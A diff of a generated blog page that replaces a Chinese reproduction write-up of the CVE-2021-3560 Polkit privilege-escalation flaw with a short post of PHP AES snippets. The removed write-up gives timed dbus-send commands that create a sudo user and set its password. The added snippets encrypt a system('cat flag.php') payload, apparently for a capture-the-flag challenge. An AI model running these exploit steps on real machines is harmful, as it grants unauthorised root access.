@@ -16,28 +16,21 @@
   <meta name="author" content="p1yang">
   <meta name="keywords" content="">
   
-    <meta name="description" content="CVE-2021-3560 Polkit权限提升漏洞6月3号，RedHat修复了一个存在七年的权限提升漏洞，该漏洞通过Linux  Polkit 来创建新的root用户 Polkit 是linux下的一个系统服务，允许特权进程给非特权进程提供服务  Polkit 则会根据特权进程提供的信息和权限配置文件进行认证 认证完成后将认证结果返回给特权进程 特权进程会根据认证结果来决定是否给非特权进程提供服">
+    <meta name="description" content="&lt;?php $key &#x3D; &amp;#x27;aaaa&amp;#x27;; $ciphertext &#x3D; base64_decode(&amp;#x27;Ki3cH0Pl9gX3Qu4gk&#x2F;La2l2WUK5WM6lO3yoarPOfKv6tLAAFt7LYtu1TsJBr&#x2F;FLV&amp;#x27;); $iv_size &#x3D; openssl_cipher_iv_length(&amp;#x27;AES-256-CBC&amp;#x27;">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CVE-2021-3560 Polkit权限提升漏洞复现">
-<meta property="og:url" content="http://example.com/article/86aaf27b.html">
+<meta property="og:title" content="php aes加密 向量重合">
+<meta property="og:url" content="http://example.com/article/335bf9d2.html">
 <meta property="og:site_name" content="p1yang">
-<meta property="og:description" content="CVE-2021-3560 Polkit权限提升漏洞6月3号，RedHat修复了一个存在七年的权限提升漏洞，该漏洞通过Linux  Polkit 来创建新的root用户 Polkit 是linux下的一个系统服务，允许特权进程给非特权进程提供服务  Polkit 则会根据特权进程提供的信息和权限配置文件进行认证 认证完成后将认证结果返回给特权进程 特权进程会根据认证结果来决定是否给非特权进程提供服">
+<meta property="og:description" content="&lt;?php $key &#x3D; &amp;#x27;aaaa&amp;#x27;; $ciphertext &#x3D; base64_decode(&amp;#x27;Ki3cH0Pl9gX3Qu4gk&#x2F;La2l2WUK5WM6lO3yoarPOfKv6tLAAFt7LYtu1TsJBr&#x2F;FLV&amp;#x27;); $iv_size &#x3D; openssl_cipher_iv_length(&amp;#x27;AES-256-CBC&amp;#x27;">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141819448.png">
-<meta property="og:image" content="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141825690.png">
-<meta property="og:image" content="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141832450.png">
-<meta property="og:image" content="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141841022.png">
-<meta property="og:image" content="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141847603.png">
-<meta property="og:image" content="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141854349.png">
-<meta property="article:published_time" content="2021-08-05T16:00:00.000Z">
-<meta property="article:modified_time" content="2022-07-20T09:57:32.000Z">
+<meta property="article:published_time" content="2023-06-08T02:08:48.127Z">
+<meta property="article:modified_time" content="2023-06-08T02:18:31.724Z">
 <meta property="article:author" content="p1yang">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141819448.png">
   
   
   
-  <title>CVE-2021-3560 Polkit权限提升漏洞复现 - p1yang</title>
+  <title>php aes加密 向量重合 - p1yang</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -202,7 +195,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="CVE-2021-3560 Polkit权限提升漏洞复现"></span>
+            <span id="subtitle" data-typed-text="php aes加密 向量重合"></span>
           
         </div>
 
@@ -213,8 +206,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2021-08-06 00:00" pubdate>
-          August 6, 2021 am
+        <time datetime="2023-06-08 10:08" pubdate>
+          June 8, 2023 am
         </time>
       </span>
     
@@ -225,7 +218,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.2k words
+          673 words
         
       </span>
     
@@ -236,7 +229,7 @@
         
         
         
-          18 mins
+          6 mins
         
       </span>
     
@@ -274,82 +267,30 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">CVE-2021-3560 Polkit权限提升漏洞复现</h1>
+            <h1 style="display: none">php aes加密 向量重合</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="CVE-2021-3560-Polkit权限提升漏洞"><a href="#CVE-2021-3560-Polkit权限提升漏洞" class="headerlink" title="CVE-2021-3560 Polkit权限提升漏洞"></a>CVE-2021-3560 Polkit权限提升漏洞</h1><p>6月3号，RedHat修复了一个存在七年的权限提升漏洞，该漏洞通过Linux  Polkit 来创建新的root用户</p>
-<p>Polkit 是linux下的一个系统服务，允许特权进程给非特权进程提供服务</p>
-<blockquote>
-<p>Polkit 则会根据特权进程提供的信息和权限配置文件进行认证</p>
-<p>认证完成后将认证结果返回给特权进程</p>
-<p>特权进程会根据认证结果来决定是否给非特权进程提供服务</p>
-<p>而我们在认证操作中断开连接，导致无法获取认证结果</p>
-<p>具体后边会详细分析</p>
-</blockquote>
-<p>由于systemd使用Polkit，所以几乎所有使用systemd的Linux都自带polkit</p>
-<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>环境：ubuntu20.04  </p>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="http://releases.ubuntu.com/20.04/ubuntu-20.04.2.0-desktop-amd64.iso">http://releases.ubuntu.com/20.04/ubuntu-20.04.2.0-desktop-amd64.iso</a> </p>
-</blockquote>
-<p>ssh（ 在本地ssh下操作）</p>
-<blockquote>
-<p>sudo apt install ssh</p>
-<p>sudo service ssh start</p>
-<p>ssh <a href="mailto:&#x75;&#x73;&#101;&#114;&#110;&#x61;&#109;&#x65;&#64;&#x31;&#x32;&#x37;&#46;&#48;&#x2e;&#x30;&#x2e;&#49;">&#x75;&#x73;&#101;&#114;&#110;&#x61;&#109;&#x65;&#64;&#x31;&#x32;&#x37;&#46;&#48;&#x2e;&#x30;&#x2e;&#49;</a></p>
-</blockquote>
-<p>具体为什么要用ssh，这里不做赘述，可以自行百度dbus</p>
-<p>dbus-send发送D-Bus消息的工具，主要用于测试</p>
-<p>可以通过dbus-send从命令行触发polkit</p>
-<p>通过dbus-send构造语句，来创建一个新用户</p>
-<blockquote>
-<p>dbus-send –system –dest&#x3D;org.freedesktop.Accounts –type&#x3D;method_call –print-reply &#x2F;org&#x2F;freedesktop&#x2F;Accounts org.freedesktop.Accounts.CreateUser string:yunku string:”YunKuSec” int32:1</p>
-</blockquote>
-<p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141819448.png" srcset="/img/loading.gif" lazyload alt="image-20220402141819448"></p>
-<p>正常情况返回肯定是认证不通过的</p>
-<p>上面说了通过中断来实现认证通过</p>
-<p>所以继续构造语句</p>
-<blockquote>
-<p>dbus-send –system –dest&#x3D;org.freedesktop.Accounts –type&#x3D;method_call –print-reply &#x2F;org&#x2F;freedesktop&#x2F;Accounts org.freedesktop.Accounts.CreateUser string:yunku string:”YunKuSec” int32:1 &amp; sleep 0.009s ; kill $!</p>
-</blockquote>
-<p>这里是开始执行后0.009秒断开连接</p>
-<p>这里多久断开连接要看具体执行时间，可以在前面加time 测试</p>
-<p>我这里大概时间在0.015秒左右，所以我提前在0.009秒断开，具体测试时看执行时间</p>
-<p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141825690.png" srcset="/img/loading.gif" lazyload alt="image-20220402141825690"></p>
-<p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141832450.png" srcset="/img/loading.gif" lazyload alt="image-20220402141832450"></p>
-<p>运气比较好，一次就成了，有个可能运气不太好，需要多试个千八百次的</p>
-<p>然后用 id 可以看到语句中构造的yunku 已经存在了，而且在sudo组，具有root权限</p>
-<p>现在已经成功利用漏洞创建了用户，但是该用户没有用户名，所以无法登陆</p>
-<p>继续构造语句来设置密码</p>
-<p><code>这里涉及到一个知识点，dbus接口设置密码需要通过散列值</code></p>
-<p>通过openssl可以生成散列值(-5是指定 sha256 算法来生成散列值， -6 是 sha512，-1 是 md5)</p>
-<blockquote>
-<p>openssl passwd -5 password</p>
-<p>(这里password是个人需要设置的密码)</p>
-</blockquote>
-<p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141841022.png" srcset="/img/loading.gif" lazyload alt="image-20220402141841022"></p>
-<p>构造设置密码语句(User1001 是创建的sudo用户uid 可以通过id 用户名查看， string 后放置密码散列值)</p>
-<blockquote>
-<p>dbus-send –system –dest&#x3D;org.freedesktop.Accounts –type&#x3D;method_call –print-reply &#x2F;org&#x2F;freedesktop&#x2F;Accounts&#x2F;User1001 org.freedesktop.Accounts.User.SetPassword string:’$5$P28GOS55linQ0Fe&#x2F;$2dn4a1duWxR9wFIYeO7qfO7ieDZvE25zPh1oxm3&#x2F;Pn6’ string:Whatever &amp; sleep 0.009s ; kill $! </p>
-</blockquote>
-<p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141847603.png" srcset="/img/loading.gif" lazyload alt="image-20220402141847603"></p>
-<p>多试这个也需要多试几次</p>
-<p>成功之后可以登陆尝试</p>
-<p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141854349.png" srcset="/img/loading.gif" lazyload alt="image-20220402141854349"></p>
-<p>至此，复现结束！</p>
-<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>通过dbus创建新用户时，dbus-send向account-daemon发起请求会先发送到dbus-daemon</p>
-<p>dbus-daemon会先添加dbus id（这里方便理解 id为 10）到请求中，然后将请求发给account-daemon</p>
-<p>account-daemon收到请求后向poklit询问id为10的连接有没有权限</p>
-<p>poklit向dbus-daemon询问该连接的uid </p>
-<p>如果返回的uid为0，就授权，否则打开验证密码窗口让用户输入密码</p>
-<p>以上步骤完成后</p>
-<p>poklit返回true给account-daemon</p>
-<p>account-daemon创建新用户</p>
-<p>但是！</p>
-<p>如果我们在<code>poklit向dbus-daemon询问该连接的uid</code>时断开，那这个连接就不存在</p>
-<p>不存在，就会返回错误</p>
-<p>而poklit的错误处理信息不会拒绝该请求，而是将uid视为0，来授权</p>
+                <div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-variable">$key</span> = <span class="hljs-string">&#x27;aaaa&#x27;</span>;
+<span class="hljs-variable">$ciphertext</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-string">&#x27;Ki3cH0Pl9gX3Qu4gk/La2l2WUK5WM6lO3yoarPOfKv6tLAAFt7LYtu1TsJBr/FLV&#x27;</span>);
+<span class="hljs-variable">$iv_size</span> = <span class="hljs-title function_ invoke__">openssl_cipher_iv_length</span>(<span class="hljs-string">&#x27;AES-256-CBC&#x27;</span>);
+<span class="hljs-variable">$iv</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$ciphertext</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$iv_size</span>);
+<span class="hljs-variable">$encrypted</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$ciphertext</span>, <span class="hljs-variable">$iv_size</span>);
+<span class="hljs-variable">$text</span> = <span class="hljs-title function_ invoke__">openssl_decrypt</span>(<span class="hljs-variable">$encrypted</span>, <span class="hljs-string">&#x27;AES-256-CBC&#x27;</span>, <span class="hljs-variable">$key</span>, OPENSSL_RAW_DATA, <span class="hljs-variable">$iv</span>);
+<span class="hljs-keyword">echo</span> <span class="hljs-variable">$text</span>;
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-variable">$key</span> = <span class="hljs-string">&#x27;aaaa&#x27;</span>;
+<span class="hljs-variable">$text</span> = <span class="hljs-string">&quot;system(&#x27;cat flag.php&#x27;)&quot;</span>;
+<span class="hljs-variable">$iv_size</span> = <span class="hljs-title function_ invoke__">openssl_cipher_iv_length</span>(<span class="hljs-string">&#x27;AES-256-CBC&#x27;</span>);
+<span class="hljs-variable">$iv</span> = <span class="hljs-title function_ invoke__">openssl_random_pseudo_bytes</span>(<span class="hljs-variable">$iv_size</span>);
+<span class="hljs-variable">$ciphertext</span> = <span class="hljs-title function_ invoke__">openssl_encrypt</span>(<span class="hljs-variable">$text</span>, <span class="hljs-string">&#x27;AES-256-CBC&#x27;</span>, <span class="hljs-variable">$key</span>, OPENSSL_RAW_DATA, <span class="hljs-variable">$iv</span>);
+<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$iv</span> . <span class="hljs-variable">$ciphertext</span>);
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
 
                 
               </div>
@@ -368,7 +309,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E4%B8%80%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E6%8A%80%E6%9C%AF/" class="category-chain-item">一些杂七杂八的技术</a>
+  <a href="/categories/%E9%9A%8F%E6%89%8B%E8%AE%B0/" class="category-chain-item">随手记</a>
   
   
 
@@ -388,8 +329,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>CVE-2021-3560 Polkit权限提升漏洞复现</div>
-      <div>http://example.com/article/86aaf27b.html</div>
+      <div>php aes加密 向量重合</div>
+      <div>http://example.com/article/335bf9d2.html</div>
     </div>
     <div class="license-meta">
       
@@ -401,7 +342,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>August 6, 2021</div>
+          <div>June 8, 2023</div>
         </div>
       
       
@@ -431,18 +372,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/article/6a1d16f9.html" title="MIPS指令集">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">MIPS指令集</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/article/c85b8ed3.html" title="智能合约">
-                        <span class="hidden-mobile">智能合约</span>
+                      <a href="/article/5e04fdd4.html" title="tenda交换机TEG5328F">
+                        <span class="hidden-mobile">tenda交换机TEG5328F</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
